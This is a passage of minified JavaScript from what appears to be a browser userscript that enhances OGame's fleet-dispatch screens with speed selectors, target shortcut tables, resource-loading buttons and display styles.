for(f=1;10>=f;f++)j=d.appendChild(document.createElement("td")).appendChild(h.createA({rel:f},null,10*f)),j.addEventListener("click",D.selectSpeed,!1),j.addEventListener("mouseover",D.changeSpeed,!1),j.addEventListener("mouseout",D.restoreSpeed,!1);h.append(a.querySelector("#fleetBriefingPart1"),c)}g(b).change(D.selectSpeed)}h.removeChildren(a.querySelector("#consumption").parentNode,3);h.removeChildren(a.querySelector("#arrivalTime").parentNode,3);h.removeChildren(a.querySelector("#returnTime").parentNode,
3);if(j=a.querySelector("#continue > span"))j.style.lineHeight="18px",g(j).append(l.getContinueTask(1))}},ShowTarget:function(a){function b(a){var b=g("img",this).attr("src"),c=1<b.indexOf("/moon_")?3:2,c="mouseleave"===a.type?"":3===c?q.color.textLimeOrange:q.color.textWhite;g(this).parent().parent().find("td").eq(7).find("a").css("color",c);a=b.substring(0,b.length-5)+("mouseleave"===a.type?"a":"b")+".gif";g("img",this).attr("src",a)}function c(a,b,c){a=b?f.splitCurrentTask(a,ma,za,ha):f.splitTask(a,
ma,za);return'<a class="anti_'+f.getTypeName(a.type)+'" href="javascript:void(0);" rel="'+f.joinTask(a,ma)+'"><span class="anti_coords">'+(a.galaxy||a.system||a.position?r.d(a.galaxy,"- ")+":"+r.d(a.system," - ")+":"+r.d(a.position," -"):"")+"</span>"+(a.type||a.mission||a.speed||c?'<span class="ago_targetIcon">'+w.IMG(w.urlTypeIcon(a.type),14)+"</span>":"")+(a.mission||a.speed||c?'<span class="ago_targetIcon">'+w.IMG(w.urlMissionIcon(a.mission),14)+"</span>":"")+(a.speed?'<span style="font-size: 9px; width: 30px">'+
(0<a.speed&&10>a.speed?10*a.speed+"%":"")+"</span>":"")+(c?'<span style="font-size: 10px;"> '+c+"</span>":"")+"</a>"}if(2>D.isTarget){var d="",j="";if(a){var k,j=[];k=m.getStorage("Coords").split(",",12);for(d=0;d<k.length;d++)k[d]&&(j[d]=c(k[d]));var l=[];k=(m.splitStorageObject(m.getStorage("Fleet_LastTask")).standard||"").split(",",12);for(d=0;d<k.length;d++)k[d]&&(l[d]=c(k[d]));var n=[];k=["F41","F42","F43","F44","F45"];for(d=0;d<k.length;d++){var p=e.get(k[d]);p&&(n[n.length]=c(p,!0))}var s=
!1;g("#aksbox option").each(function(){if(this.value){var a=this.value.split("#");3<a.length&&(s||(n[n.length]="",n[n.length]='<span style="text-align: center; font-size: 12px; width: 96%;">'+g('#shortcuts span[id^="combatunits"]').text()+"</span>",s=!0),n[n.length]=c([a[0],a[1],a[2],a[3],2,0,0,0,a[5]].join(":"),!1,r.d(this.innerHTML)))}});k=[];for(d=1;d<f.PlanetsByIndex.length;d++)p=f.PlanetsByIndex[d],k[d-1]='<td class="ago_target_border" style="min-width: 140px; border-right: none;"><a class="anti_own" href="javascript:void(0);" rel="'+
f.Planets[p].coords+':1"><span style="color: '+(p===f.PlanetsActive.id?q.color.textLimeGreen:q.color.textBlueNote)+'">'+d+'</span><span class="anti_coords">'+f.Planets[p].coords+'</span><span class="anti_coords" style="font-size: 10px; max-width: 120px; overflow: hidden;">'+f.Planets[p].name+'</span></a></td><td class="ago_target_border" style="min-width: 26px; border-left: none; border-right: none;">'+(f.Planets[p].moon?'<a class="anti_icon anti_moon" href="javascript:void(0);" rel="'+f.Planets[p].coords+
':3">'+w.IMG(w.urlTypeIcon(3),18)+"</a></td>":"</td>")+'<td class="ago_target_border" style="min-width: 26px; border-left: none;"><a class="anti_icon anti_debris" href="javascript:void(0);" rel="'+f.Planets[p].coords+':2">'+w.IMG(w.urlTypeIcon(2),18)+"</a></td>";for(var p="",u=Math.min(16,Math.max(j.length,Math.max(l.length,Math.max(n.length,k.length)))),d=0;d<=u;d++)p+='<tr><td style="min-width: 15px;"></td><td class="ago_target_border" style="min-width: 80px;">'+(j[d]?j[d]:" ")+'</td><td></td><td class="ago_target_border" style="min-width: 120px;">'+
(l[d]?l[d]:" ")+'</td><td></td><td class="ago_target_border" style="min-width: 160px; max-width: 180px;">'+(n[d]?n[d]:" ")+"</td><td></td>"+(k[d]?k[d]:'<td class="ago_target_border" style="min-width: 200px;" colspan="3"></td>')+'<td style="min-width: 15px;"></td></tr>';j=w.TABLE("","ago_target_content","100%","0","0",p)}D.isTarget?(g("#ago_target div.ago_target_content").append(j),D.isTarget=2):(D.isTarget=a?2:1,d='<span style="min-width: 110px;">Copy</span><span style="min-width: 125px;">'+e.label("FLB")+
'</span><span style="min-width: 180px;">'+e.label("F40")+'</span><span style="min-width: 195px;">'+g('#shortcuts span[id^="shortlinks"]').text()+'</span><a class="ago_display_arrow" href="javascript:void(0);"></a>',g("#inhalt").append('<div id="ago_target" ago_display_status="'+D.isTarget+'"><div class="ago_target_header">'+d+'</div><div class="ago_target_content">'+j+'</div><div class="ago_target_footer"></div></div>'),h.addEvent("#ago_target .ago_target_header","click",D.clickTargetArrow));a&&(a=
document.querySelectorAll("#ago_target .ago_target_content a"),h.addEventAll(a,"click",function(a){a&&a.currentTarget&&D.setTask(a.currentTarget.rel)}),e.is("A24")&&h.addEventAll(a,"dblclick",function(){h.click("#fleet2 #continue")}),a=document.querySelectorAll("#ago_target a.anti_icon"),h.addEventAll(a,"mouseenter",b),h.addEventAll(a,"mouseleave",b))}},styles:function(){l.styles();e.is("F00")&&(q.setCache(["#fleetStatusBar { display: none; }","#fleet2 .planetname { color: "+q.color.textBlueGrey+
"; }","#fleet2 .coords span { font-size: 12px; }","#shortcuts { padding: 32px 0 0 23px; }","#ago_fleet_player { text-align: center !important;  padding: 0 !important; position: absolute; top: 9px; }","#ago_briefing_info { position: absolute; right: 25px; }","ul.fleetBriefing { margin: 2px 0 4px 15px; }","#fleet2 #buttonz ul { list-style-type: none; position: relative; }","#fleet2 #buttonz ul#fleetBriefingPart1_2 { margin-left: 30px; }","ul.fleetBriefing li { width: 260px; padding: 0 0 2px 0; }","#fleet2 #buttonz ul#fleetBriefingPart1 li { width: 320px; }",
"#fleet2 #buttonz ul#fleetBriefingPart1_2 li:nth-child(3) { position: absolute; top: 42px; }","#fleet2 #buttonz ul li span.value { float: right; }","#fleet2 #buttonz ul#fleetBriefingPart1 li:first-child span.value { float: none; }","#ago_fleet_speed { position: absolute; top: 70px; left: 10px; }","#ago_fleet_speed table { width: auto; padding: 0; margin: 6px; float: left; border-collapse: collapse;}","#ago_fleet_speed td { text-align: center; padding: 0 2px; }","#ago_fleet_speed a { padding: 3px 3px; text-decoration: none; font-size: 13px; font-weight: 700; font-size: 13px; color: "+
q.color.textBlue+"; }","#ago_fleet_speed a:hover { background-color: #212A33; border-radius: 3px; }","#ago_fleet_speed a.ago_fleet_speed_selected { box-shadow: 0 0 2px 1px #FF9600; border-radius: 3px; }","#steps { position: absolute; top: 100px; right: 0px; }"]),q.setCache(["#ago_target { width: 669px; height: auto; padding: 0px; margin: 0px auto; }",'.ago_target_header { background: url("/cdn/img/layout/eventList-header.gif") no-repeat scroll 0 0 transparent; height: 28px; cursor: pointer; }','.ago_target_content { background: url("/cdn/img/layout/eventList-body.gif") repeat-y scroll 5px 0 transparent; }',
'.ago_target_footer { background: url("/cdn/img/layout/eventList-footer.gif") no-repeat scroll 0 0 transparent; height: 17px;}',".ago_target_header span { color: "+q.color.textBlue+"; text-align: center; padding-top: 7px; display: inline-block; }",".ago_target_header .ago_display_arrow { float: right; position: relative; top: 4px; right: 12px; }",'#ago_target[ago_display_status="1"] .ago_target_content { display: none; }',".ago_target_content td { color: "+q.color.textBlue+"; border: 0 solid #000000; white-space: nowrap; padding: 0; vertical-align: middle; overflow: hidden; width: 15px; }",
".ago_target_content td.ago_target_border { border-left-width: 1px; border-right-width: 1px; }",".ago_target_content tr:first-child td.ago_target_border { border-top-width: 1px; }",".ago_target_content tr:last-child td.ago_target_border { border-bottom-width: 1px; }",".ago_target_content a { color: "+q.color.textBlue+"; display: inline-block; font-size: 11px; text-decoration: none; padding: 0; height: 20px; line-height: 20px; width: 100%; }",".ago_target_content a:hover { background-color: #212A33;}",
".ago_target_content a.anti_icon { width: 26px; padding: 1px 0; text-align: center; }",".ago_target_content a.anti_moon:hover, .ago_target_content a.anti_moon.selected { color: "+q.color.textLimeOrange+"; }",".ago_target_content a.anti_debris:hover, .ago_target_content a.anti_debris.selected { color: "+q.color.textWhite+"; }",".ago_target_content a.anti_planet:hover, .ago_target_content a.anti_planet.selected, #ago_target a.anti_own:hover { color: "+q.color.textLimeGreen+"; }",".ago_target_content span { display: inline-block; min-width: 14px; padding: 0 2px; line-height: 12px; vertical-align: middle; }",
".ago_target_content span.anti_coords { min-width: 54px; }",".ago_fleet_continue_task td { font-size: 10px; padding: 0 2px 0 0; text-align: center; width: 20px; }"]))},clickTargetArrow:function(){var a;D.ShowTarget(!0);a=1<h.getAttribute("#ago_target","ago_display_status")?1:2;h.setAttribute("#ago_target","ago_display_status",a)},changeType:function(a){if(a=n.d(a))if(f.updateCoords(l.Next,"",1,h.getValueByIdInteger("galaxy"),h.getValueByIdInteger("system"),h.getValueByIdInteger("position")),a===f.checkType(l.Next,
a))return D.lockUpdateNext||(l.Next.type=a),!0;return!1},selectSpeed:function(a,b){if(a&&a.currentTarget||b)if(b=n.d(b||a.currentTarget.value||a.currentTarget.getAttribute("rel")))D.timeoutRestoreSpeed=null,l.Next.speed=b,D.updateSpeed(b,!0)},changeSpeed:function(a){a&&a.currentTarget&&(D.timeoutRestoreSpeed=null,(a=n.d(a.currentTarget.getAttribute("rel")))&&!D.blockDynamicSpeed&&D.updateSpeed(a))},restoreSpeed:function(){D.blockDynamicSpeed||(D.timeoutRestoreSpeed=setTimeout(function(){D.timeoutRestoreSpeed&&
D.updateSpeed(Math.min(l.Next.speed,l.Next.maxspeed||10));D.timeoutRestoreSpeed=null},100))},updateSpeed:function(a,b){var c,d,e;D.lockUpdateSpeed=!0;if((c=document.getElementById("fleetBriefingPart1"))&&D.status){if(d=c.querySelector("#speed")){e=n.d(d.value);a=a||e||10;if(a!==e||s.speed!==e)s.speed=a,d.value=a,s.updateVariables();s.updateTimes()}if(d=c.querySelector(".dropdown.currentlySelected a"))d.setAttribute("data-value",a),d.textContent=10*a;if(d=c.querySelector("#ago_fleet_speed"))if(d.className=
"ago_speed_"+a,b){c=d.querySelectorAll("a");for(d=0;d<c.length;d++)c[d].className=a===d+1?"ago_fleet_speed_selected":""}2===l.Next.mission&&(c=Math.floor(100*(n.d(s.duration,1)/130)),h.setTextById("ago_fleet_acsduration_time",A.formatTime(c)))}D.lockUpdateSpeed=!1},setTask:function(a){var b,c,d;if((b=document.querySelector("#contentWrapper > form"))&&D.status)a=f.splitTask(a,ma,za),D.lockUpdateDisplay=!0,a.union&&((c=b.querySelector('#aksbox option[value$="#'+a.union+'"]'))?(l.Next.mission=2,h.setValueChange(c.parentNode,
c.value)):a.union=0),a.union||(h.setValue('input[name="union"]',0,b),c=[a.galaxy,a.system,a.position,a.type].join("#"),(c=b.querySelector('#slbox option[value^="'+c+'"]'))?h.setValueChange(c.parentNode,c.value):(b=document.getElementById("galaxy"),c=document.getElementById("system"),d=document.getElementById("position"),b&&(c&&d)&&(a.galaxy&&h.setValueChange(b,a.galaxy),a.system&&h.setValueChange(c,a.system),a.position&&h.setValueChange(d,a.position),f.updateCoords(l.Next,"",3,n.d(b.value),n.d(c.value),
n.d(d.value))),a.type=f.checkType(l.Next,a.type),a.type&&h.click(J.choose(a.type,"","#pbutton","#dbutton","#mbutton"))),l.Next.mission=f.checkMission(l.Next,l.Next,a.mission||l.Task.mission,0)||l.Next.mission),n.isMinMax(a.speed,1,10)&&D.selectSpeed(null,a.speed),D.lockUpdateDisplay=!1,D.updateDisplay()},backTask:function(){l.Task.union=h.getValueInteger('#contentWrapper input[name="union"]');m.setStorage("Fleet1_Task",f.joinTaskFleet(l.Task,1));K.addFeedback("#back")},nextTask:function(){s.validated&&
(D.blockDynamicSpeed=!0,D.updateDisplay(),m.setStorage("Fleet3_Task",f.joinTaskFleet(l.Next,1)),K.addFeedback("#continue"))},updateDisplayOgame:function(a){if(6<=D.status){var b=Math.max(0,D.updateDisplayOgameCounter||0);!0===a?!D.lockUpdateDisplay&&!D.lockUpdateSpeed&&(b||setTimeout(D.updateDisplayOgame,0),b++):(b--,0>=b?D.updateDisplay():(b=1,setTimeout(D.updateDisplayOgame,0)));D.updateDisplayOgameCounter=b}},updateDisplay:function(){var a,b,c,d,j,g;if((a=document.querySelector("#contentWrapper > form"))&&
6<=D.status&&!D.lockUpdateDisplay){D.updateDisplayCounter=1;D.lockUpdateNext=!0;D.lockUpdateDisplay=!0;d={coords:l.Next.coords};f.updateCoords(l.Next,"",1,h.getValueByIdInteger("galaxy"),h.getValueByIdInteger("system"),h.getValueByIdInteger("position"));d.coords!==l.Next.coords&&(l.Next.mission=l.Task.mission);l.Next.union=h.getValueInteger('input[name="union"]',a);if(b=a.querySelector("#aksbox"))if((c=l.Next.union?b.querySelector('option[value$="#'+l.Next.union+'"]'):null)&&-1<(c.value||"").indexOf([l.Next.galaxy,
l.Next.system,l.Next.position,l.Next.type].join("#"))?l.Next.mission=2:(l.Next.union=0,2===l.Next.mission&&(l.Next.mission=l.Task.mission),b.selectedIndex=0,c=b.options[0],h.setValue('input[name="union"]',0,a)),b=b.parentNode.querySelector(".combatunits a"))b.setAttribute("data-value",c.value),b.textContent=c.textContent;for(j in l.Next)d[j]=l.Next[j];d.type=f.checkType(d,d.type);d.mission=f.checkMission(d,d,d.mission,3);f.selectMission(d,3);f.selectType(d,4);h.setValue('input[name="mission"]',d.mission,
a);d.type!==h.getValueInteger("input#type",a)&&h.click(["","#pbutton","#dbutton","#mbutton"][d.type],a);B.feedbackPlanets(d.coords,d.type);if(b=a.querySelector("#slbox"))if(j=[d.galaxy,d.system,d.position,d.type].join("#"),(c=b.querySelector('option[value^="'+j+'"]'))&&d.owncoords&&2!==d.type?b.value=c.value:(b.selectedIndex=0,c=b.options[0]),(b=b.parentNode.querySelector(".dropdown.planets a"))&&c)b.setAttribute("data-value",c.value),b.innerHTML=r.d(c.getAttribute("data-html-prepend"))+r.d(c.textContent);
b=a.querySelectorAll("#ago_target .ago_target_content a:not(.anti_own):not(.anti_icon)");if(b.length&&d.coords){h.removeClassAll(b,"selected");c=[d.coords,d.type,d.mission,d.speed];do{g=c.join(":");for(j=0;j<b.length;j++)if(0===(b[j].rel||"").indexOf(g)){h.addClass(b[j],"selected");c.length=1;break}c.length--}while(0<c.length)}b=a.querySelectorAll("#ago_target .ago_target_content a.anti_own");if(b.length&&d.owncoords)for(j=0;j<b.length;j++)b[j].className=b[j].rel===d.coords+":1"?"anti_own selected anti_"+
f.getTypeName(d.type):"anti_own";l.Next.maxspeed=10;if(e.is("F13")){j=s.speed;do if(s.speed=l.Next.maxspeed,s.duration=s.getDuration(),s.consumption=s.getConsumption(),1<l.Next.maxspeed&&(s.consumption>s.storageCapacity||s.consumption>s.currentDeuterium))l.Next.maxspeed--;else break;while(1);s.speed=j;s.duration=s.getDuration();s.consumption=s.getConsumption()}D.updateSpeed(Math.min(l.Next.speed,l.Next.maxspeed),!0);D.updatePlayer(d.type,!0);1<=I.status&&(l.Next.coords!==l.Next.playerCoords&&!l.Next.owncoords)&&
(l.Next.playerCoords=l.Next.coords,l.Next.playerID=0,D.loadPlayer(l.Next));l.updateContinueButton(1,d);h.setDisplay("#fleetBriefingPart1 #ago_fleet_acsduration","list-item",2===d.mission,a);D.lockUpdateNext=!1;D.lockUpdateDisplay=!1}},updatePlayer:function(a){var b=2===a?"":"?",c=q.color.textBlueGrey,d="?";16===l.Next.position?(b=e.label("LM15"),c=e.get("E65")):l.Next.owncoords?(d="",c=J.choose(a,"",q.color.textLimeGreen,q.color.textWhite,q.color.textLimeOrange),b=""):l.Next.coords===l.Task.coords?
(d=w.getPlayer(l.Task),b=J.choose(a,"",l.Task.planetName,"",l.Task.moonName)):1<=I.status&&(l.Next.coords===l.Next.playerCoords&&l.Next.playerID)&&(d=w.getPlayer(l.Next),b=J.choose(a,"",l.Next.planetName,"",l.Next.moonName));b&&g("#targetPlanetName").html(b);g("#targetPlanetName").css("color",c);g("#ago_fleet_player").html(d)},loadPlayer:function(a,b){var c=a.coords;I.getUniverseByCoord(c,function(d){d.id&&c===l.Next.coords&&I.getPlayerById(d.id,function(e){e.name&&c===l.Next.coords&&(a.playerID=
d.id,b?(a.planetName||(a.planetName=d.nP||""),a.moonName||(a.moonName=d.nM||"?")):(a.planetName=d.nP||"",a.moonName=d.nM||"?",a.playerStatus=f.getPlayerStatusDataBase(e.status),a.playerName=e.name,D.updatePlayer(a.type)))})})}},G={Run:function(){e.is("F00")&&(G.Init(),G.InitOgame(),G.Show(),l.ShowInfo())},Ready:function(){e.is("F00")&&(s.updateTimes&&s.updateTimes(),G.setTask(),G.updateDisplayCounter||G.updateDisplay(),l.Task.owncoords&&B.feedbackPlanets(l.Task.coords,l.Task.type));K.toggleLargeHeader(e.is("F00")&&
e.is("F15"))},Complete:function(){e.is("F00")&&(h.addEvent("#back","click",G.backTask),e.is("A24")&&h.addEventAll("#missions .on a","dblclick",function(){K.addFeedback(this);h.click("#start.on")}));K.disableAutocomplete();e.checkLabelsMissions()},Timer:function(){G.updateResources();G.isCheckACS&&(0<=Math.floor(s.durationAKS)?h.setStylesById("duration",{color:s.duration<s.durationAKS?q.color.textLimeGreen:s.duration<1.3*s.durationAKS?q.color.textOrange:q.color.textPaleRed}):G.isCheckACS=!1)},Keydown:function(a){return 65===
a.keyCode?(h.click("#allresources"),!1):77===a.keyCode?(h.click("#mostresources"),!1):81===a.keyCode?(h.click("#noneresources"),!1):!0},Init:function(){var a,b;l.Task={};l.getTask(document.querySelectorAll("#sendfleet .content > form input"),m.getStorage("Fleet3_Task"));l.getStatusBar(l.Task,document.getElementById("inhalt"));l.Task.retreatAfterDefenderRetreat=0;l.Task.union=l.Task.union2;f.updateCoords(l.Task,l.Task,2);l.Next={};for(b in l.Task)l.Next[b]=l.Task[b];G.Maxi={};G.Minimum=f.splitCurrentTask(e.get("F31"),
1,ta,ha);if(a=12===l.Task.routine?"F81":13===l.Task.routine?"F91":"")for(b in a=f.splitCurrentTask(e.get(a),1,ta,ha,!0),a)a[b]&&(G.Minimum[b]=Math.max(a[b],0));G.Minimum.preferResource=n.minMax(G.Minimum.preferResource,1,3)},InitOgame:function(){var a=s.updateVariables;s.updateVariables=function(){a();G.updateDisplay()};var b=s.trySubmit;s.trySubmit=function(){s.validated&&document.activeElement.blur();b();G.nextTask()};s.submitOnEnter=function(){return!0}},Show:function(){var a,b,c,d,j,g;if(a=document.getElementById("inhalt")){d=
a.querySelectorAll("#missions > li.off a");for(b=0;b<d.length;b++)try{d[b].onclick=null}catch(k){}h.removeChildren("#missionNameWrapper",3);if(c=a.querySelector("#loadAllResources"))for(g in b=c.parentNode,d=r.trim(c.textContent),c.innerHTML="",c.appendChild(h.createA({id:"allresources","class":"ago_fleet_loadAllResources tooltip js_hideTipOnMobile",title:d})).addEventListener("click",G.clickAllResources,!1),c.appendChild(h.createA({id:"mostresources","class":"ago_fleet_loadAllResources tooltip js_hideTipOnMobile",
title:e.label("F38")})).addEventListener("click",G.clickAllResources,!1),c.appendChild(h.createA({id:"noneresources","class":"ago_fleet_loadAllResources tooltip js_hideTipOnMobile",title:e.label("F39")})).addEventListener("click",G.clickAllResources,!1),h.addClass(b.querySelectorAll(".res_wrap")[G.Minimum.preferResource-1],"ago_fleet_preferResource"),f.ItemResource)if(d=b.querySelector("#"+g))if(d.parentNode.appendChild(h.createA({"class":"ago_fleet_loadResource ago_fleet_allResource",rel:g,mode:4})).addEventListener("click",
G.clickResource,!1),d.parentNode.appendChild(h.createA({"class":"ago_fleet_loadResource ago_fleet_mostResource",rel:g,mode:3})).addEventListener("click",G.clickResource,!1),d.parentNode.appendChild(h.createA({"class":"ago_fleet_loadResource ago_fleet_noneResource",rel:g,mode:0})).addEventListener("click",G.clickResource,!1),c=d.parentNode.parentNode.querySelector(".res_img"))j=h.createA({rel:g}),j.addEventListener("click",G.clickResourceIcon,!1),j.appendChild(c),j.appendChild(h.create("span",{id:"ago_fleet_remaining_"+
g,"class":"ago_fleet_remaining ago_text_background"})),h.prepend(d.parentNode.parentNode,j);if(b=a.querySelector("#roundup")){if(c=b.querySelector("#fightAfterRetreat + li span"))c.className="value",d=document.createElement("li"),d.appendChild(h.create("span",{"class":"value"},null,"",w.getPlayer(l.Task))),h.after(c.parentNode,d);if(c=b.querySelector("#duration"))d=document.createElement("li"),d.className="ago_speed_"+l.Task.speed,d.appendChild(h.create("span",{"class":"value",rel:l.Task.speed},null,
10*l.Task.speed+" %")),h.after(c.parentNode,d);h.removeChildren(a.querySelector("#arrivalTime").parentNode,3);h.removeChildren(a.querySelector("#returnTime").parentNode,3);h.removeChildren(a.querySelector("#consumption").parentNode,3);(c=b.querySelector("#holdtimeline"))&&c.parentNode.appendChild(c);(c=b.querySelector("#expeditiontimeline"))&&c.parentNode.appendChild(c);(c=b.querySelector("#fightAfterRetreat"))&&c.parentNode.appendChild(c)}}},styles:function(){l.styles();e.is("F00")&&q.setCache(["#fleetStatusBar { display: none; }",
"#fleet3 ul#missions span.textlabel { display: none; }","#fleet3 ul#missions .on a:hover span.textlabel { display: inline-block; }","#fleet3 #missionNameWrapper { text-align: center; font-size: 18px; }","#missionNameWrapper p { display: none; }","#fleet3 #sendfleet #resources { height: 190px; }","#loadAllResources { width: 130px; left: 175px; top: 20px; }",".ago_fleet_loadAllResources { display: block; float: left; height: 32px; width: 32px; margin: 10px 5px !important; }",'#mostresources, .ago_fleet_mostResource { background: url("'+
q.image.ShipsMost+'") no-repeat scroll left top transparent; }',"#noneresources, .ago_fleet_noneResource { background: url(/cdn/img/navigation/icon-none.jpg) no-repeat scroll left top transparent; }","#mostresources:hover, #noneresources:hover { background-position: 0 -32px !important; }","#allresources:hover { background-position: -374px -194px !important; }","#fleet3 #sendfleet #resources .res_wrap { position: relative; width: 142px; height: 38px; margin: 10px 0 20px 0; }","#fleet3 #sendfleet #resources .res_wrap.ago_fleet_preferResource { border-color: #A26D00; }",
"#fleet3 #sendfleet .res { width: 92px; }","#fleet3 #sendfleet .res_img { margin-top: 4px;}","#fleet3 #sendfleet .res input { font-size: 12px; width: 85px; }","#resources .res_wrap .max, #resources .res_wrap .min { display: none; }",".ago_fleet_loadResource { display: inline-block; height: 16px; width: 16px; margin: 2px 5px; }",".ago_fleet_allResource { background: url(http://gf3.geo.gfsrv.net/cdnea/fa0c8ee62604e3af52e6ef297faf3c.gif) no-repeat scroll 1px 1px transparent; background-size: 14px 14px; }",
".ago_fleet_mostResource, .ago_fleet_noneResource { background-size: 16px 32px; }",".ago_fleet_remaining { position: absolute; top: 2px; left: 2px; max-width: 40px; height: auto; padding: 2px; color: "+q.color.textBright+"; font-size: 11px; text-align: left; white-space: nowrap; overflow: hidden; }","#fleet3 #roundup, #fleet3 .briefing_overlay { min-height: 190px; }","#fleet3 #roundup ul { margin-left: 15px; }","#fleet3 #roundup ul li { overflow: hidden; }","#fleet3 #roundup ul li:nth-child(2), #fleet3 #roundup ul li:nth-child(5), #fleet3 #roundup ul li:nth-child(7), #fleet3 #roundup ul li:nth-child(8) { padding-bottom: 8px; }",
"#fleet3 #roundup ul li span.value { float: right; }","#fleet3 #roundup .dropdown.currentlySelected { float: right; }","#expeditiontimeline span.value { display: none; }"])},clickResource:function(){var a,b;a=this.rel;b=n.d(this.getAttribute("mode"));f.ItemResource[a]&&(4===b?G.setResource(a,0,4):3===b?G.setResource(a,G.Minimum[a],3):0===b&&G.setResource(a))},clickAllResources:function(){"allresources"===this.id?G.setAllResources(4):"mostresources"===this.id?G.setAllResources(3,G.Minimum):"noneresources"===
this.id&&G.setAllResources()},clickResourceIcon:function(){var a,b;this&&(this.rel&&f.ItemResource[this.rel])&&(a=this.rel,b=h.getValueByIdInteger(a),0===b?G.setResource(a,0,4):b<f.UnitsActiveStart[a]?G.setResource(a,b,3):G.setResource(a))},setResource:function(a,b,c){b=4===c?G.Maxi[a]:3===c?Math.max(G.Maxi[a]-n.d(b),0):c?b:0;if(a=document.getElementById(a))if(a.value=r.d(b||"0"),a.onkeyup)a.onkeyup()},setAllResources:function(a,b){var c,d,e,g,f;d=J.choose(G.Minimum.preferResource,[],[0,1,2],[1,2,
0],[2,1,0]);e=["metal","crystal","deuterium"];for(f=0;f<e.length;f++)if(c=document.getElementById(e[f]))if(c.value=r.d(g||"0"),c.onkeyup)c.onkeyup();if(a)for(f=0;f<d.length;f++)g=b?n.d(b[e[d[f]]]):0,G.setResource(e[d[f]],g,a)},updateResources:function(){for(var a in f.ItemResource)G.Maxi[a]=f.UnitsActive[a],s[a+"OnPlanet"]=f.UnitsActive[a];G.Maxi.deuterium=f.UnitsActive.deuterium-s.consumption},updateDisplay:function(){var a,b;if((a=document.getElementById("inhalt"))&&6<=G.status){G.updateDisplayCounter=
1;G.updateResources();G.updateTask(l.Next,1);for(b in f.ItemResource)h.setHtmlById("ago_fleet_remaining_"+b,r.shortNumber(Math.max(G.Maxi[b]-l.Next[b],0)));G.isCheckACS=h.isDisplay("#aks",a);h.setClass("#missionNameWrapper",f.getMissionClass(l.Next.mission),a);if(l.Next.holdingtime&&(b=a.querySelector("#holdtimeline .dropdown a")))b.setAttribute("data-value",Math.max(l.Next.holdingtime,0)||"0"),b.textContent=Math.max(l.Next.holdingtime,0)||"0";if(l.Next.expeditiontime&&(b=a.querySelector("#expeditiontimeline .dropdown a")))b.setAttribute("data-value",
l.Next.expeditiontime),b.textContent=l.Next.expeditiontime}},setTask:function(){var a,b,c;if((a=document.getElementById("inhalt"))&&G.status){l.Task.holdingtime&&h.setValue("#holdtimeline select",Math.max(l.Task.holdingtime,0)||"0",a);l.Task.expeditiontime&&h.setValue("#expeditiontimeline select",l.Task.expeditiontime,a);l.Task.retreatAfterDefenderRetreat&&h.setProperty("#fightAfterRetreat input","checked",!0,a);9===l.Task.routine&&G.setAllResources(1,l.Task);12===l.Task.routine&&G.setAllResources(3,
G.Minimum);if(e.is("F20")&&!a.querySelector("#missions a.selected")){b=[15,7,8,Aa,1,4,3];for(c=0;c<b.length;c++)if(a.querySelector("#button"+b[c]+".on")){h.click("#missionButton"+b[c]);break}}if(l.Task.holdingtime||l.Task.expeditiontime)s.updateHoldingOrExpTime(),s.updateVariables()}},updateTask:function(a,b){var c;if((c=document.getElementById("inhalt"))&&G.status)a.holdingtime=h.getValueInteger("#holdtimeline select",c)||-1,a.expeditiontime=h.getValueInteger("#expeditiontimeline select",c),a.retreatAfterDefenderRetreat=
h.getProperty("#fightAfterRetreat input","checked",c),a.mission=h.getValueInteger('input[name="mission"]',c),1<=b&&(a.metal=h.getValueInteger("#metal",c),a.crystal=h.getValueInteger("#crystal",c),a.deuterium=h.getValueInteger("#deuterium",c))},backTask:function(){G.updateTask(l.Task,ma);m.setStorage("Fleet2_Task",f.joinTaskFleet(l.Task,1));K.addFeedback("#back")},nextTask:function(){var a,b;if((a=document.getElementById("inhalt"))&&G.status&&s.validated){K.addFeedback("#start",a);f.updateUnits(l.Task,
3,0,!0);G.updateTask(l.Next,ma);if(!l.Next.routine||10>l.Next.routine||e.is("FL2"))(e.is("FL1")||!f.PlanetsByCoords[l.Next.coords])&&f.setTaskQueue("Fleet_LastTask",l.Next,ba,0,ba);e.is("F18")&&7===l.Next.mission&&(a=h.getText("#countColonies").trim().split("/"),b=n.parseIntAbs(a[0]),0<b&&b>=n.parseIntAbs(a[1])&&setTimeout(h.click,300,"#errorBoxDecision a.yes"));11===l.Next.routine&&15===l.Next.mission&&(a=m.getStorageObject("Fleet_Expedition"),b=f.PlanetsActive.galaxy+":"+f.PlanetsActive.system,
a[b]=Math.min(n.d(a[b])+1,999),m.setStorageObject("Fleet_Expedition",a))}}},ga={Run:function(){e.is("E10")&&(ga.isRun=!0,ga.Init(),ga.Show())},Ready:function(){K.toggleLargeHeader()},Tooltip:function(){return 0},Init:function(){var a,b;ga.missionByName={};for(a=1;16>=a;a++)(b=e.label("LM"+r.trimZero(a,2)))&&(ga.missionByName[b]=a)},Show:function(){for(var a=g('#inhalt div.fleetDetails[id^="fleet"]'),b=0;b<a.length;b++){var c=a.get(b);ga.expandFleet(c);ga.addReversalTimeBox(c);ga.showTargetName(c)}A.isLocal&&
(A.changeTime("#inhalt .absTime, #inhalt .nextabsTime"),A.changeTimeTitle("#inhalt .reversal .tooltipHTML, #inhalt .starStreak .tooltipHTML"));setInterval(ga.updateReversalClock,200)},styles:function(){e.is("E10")&&(e.is("E12")&&q.setCache([".detailsOpened .starStreak  { background: none; }",".ago_movement_details { position: absolute; left: 60px; width: 290px; white-space: normal; padding: 0 7px; font-size: 9px; text-align: left; line-height: 11px; }",".detailsOpened .fleetDetailButton { display: inline; visibility: visible; position: absolute; left: 295px; line-height: normal; top: 2px; }",
".detailsOpened .fleetDetailButton .fleet_icon_forward_end { display: none; visibility: hidden; }"]),q.setCache([".ago_movement_reversalTime { position: absolute; top: 46px; left: 560px; color: yellow; }",".ago_movement_targetName { position: absolute; top: 45px; left: 7px; color: green; }"]))},addReversalTimeBox:function(a){if(g(".reversal",a).length){var b=g(".starStreak .origin img",a).attr("title");if(b&&(b=A.parse2(b)))b.setTime(b.getTime()+A.timeZoneDelta),g(a).append('<span class="ago_movement_reversalTime" + title="'+
